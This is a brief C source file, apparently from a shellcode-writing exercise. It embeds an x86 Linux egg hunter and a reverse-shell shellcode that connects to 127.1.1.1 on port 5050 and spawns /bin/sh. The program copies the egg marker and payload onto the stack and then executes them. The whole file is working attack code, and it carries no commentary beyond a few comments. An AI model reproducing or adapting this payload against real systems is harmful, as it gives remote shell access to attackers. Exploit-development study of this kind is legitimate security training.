// File: shellcode_no_memcheck.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// remember egg hunter assembly, mov edx, 0x464e464e
#define EGG "\x4e\x46\x4e\x46"

// this line inserts 1x EGG string to binary .data section
unsigned char egg[] = EGG;

// this line inserts 1x EGG string to binary .data section
unsigned char egghunter[] = \
"\x89\xe0\xba\x4e\x46\x4e\x46\x40\x39\x10\x75\xfb\x39\x50\x04\x75\xf6\xff\xe0";

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x68\x7f\x01\x01\x01\x66\x68\x13\xba\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x41\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xf7\xe1\xb0\x0b\xcd\x80";

main()
{
    printf("Egghunter Length:  %d\n", sizeof(egghunter) - 1);

    char stack[200];
    printf("Memory location of shellcode: %p\n", stack);

    // this 2 lines inserts 2x EGG strings to binary [stack] section
    strcpy(stack, egg);
    strcpy(stack + 4, egg);
    strcpy(stack + 8, shellcode);

    int (*CodeFun)() = (int(*)())egghunter;
    CodeFun();
}
